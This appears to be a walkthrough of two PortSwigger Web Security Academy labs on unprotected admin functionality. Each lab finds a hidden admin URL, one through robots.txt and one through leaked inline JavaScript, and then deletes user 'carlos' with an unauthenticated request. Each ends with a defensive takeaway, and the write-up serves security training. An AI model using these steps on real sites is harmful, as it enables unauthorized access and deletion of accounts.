### [PS-AC-01] Unprotected admin functionality

**Scenario:** The application exposes an administrative panel without any authentication or access control checks, relying entirely on the URL being unlinked from the main interface to hide it from standard users.

**Solution:**

1. Send a request for `GET /robots.txt` in Burp Repeater or view it in your browser:

```http
GET /robots.txt HTTP/1.1
Host: target.web-security-academy.net

```

2. Inspect the response body to discover a disallowed path revealing the administrative endpoint:

```http
User-agent: *
Disallow: /administrator-panel

```

3. Navigate to `/administrator-panel` in your browser.
4. Locate the user management interface and click **Delete** next to user `carlos` to invoke the administrative deletion action:

```http
GET /administrator-panel/delete?username=carlos HTTP/1.1

```

> **Key Takeaway:** "Security through obscurity" is not access control. Disallowing crawlers in `robots.txt` publicly advertises sensitive paths to attackers; administrative functionality must enforce strict, server-side authentication and role-based access controls on every request.

---

### [PS-AC-02] Unprotected admin functionality with unpredictable URL

**Scenario:** The application attempts to secure its administrative panel by placing it at an unpredictable, randomized URL without enforcing server-side authorization checks. However, the application leaks this hidden URL directly within client-side JavaScript source code rendered to all users.

**Solution:**

1. Intercept `GET /` in Burp Repeater or open the target home page source code in your browser.
2. Inspect the HTML response body for inline `<script>` tags that handle navigation or user roles.
3. Locate the script block disclosing the secret administrative path:

```javascript
<script>
    var isAdmin = false;
    if (isAdmin) {
        var topMenuAttribute = document.createElement("a");
        topMenuAttribute.setAttribute("href", "/admin-yg36x8");
        topMenuAttribute.innerText = "Admin panel";
        document.getElementById("main-menu").appendChild(topMenuAttribute);
    }
</script>

```

4. Navigate directly to the disclosed endpoint in your browser or Burp Repeater:

```http
GET /admin-yg36x8 HTTP/1.1
Host: target.web-security-academy.net

```

5. Locate user `carlos` on the administration page and click **Delete** to trigger the deletion request:

```http
GET /admin-yg36x8/delete?username=carlos HTTP/1.1

```

> **Key Takeaway:** Relying on secret or randomized URLs for administrative interfaces is a form of security through obscurity. Any endpoint rendered or referenced in client-side scripts is visible to regular users and must be protected by server-side authorization checks.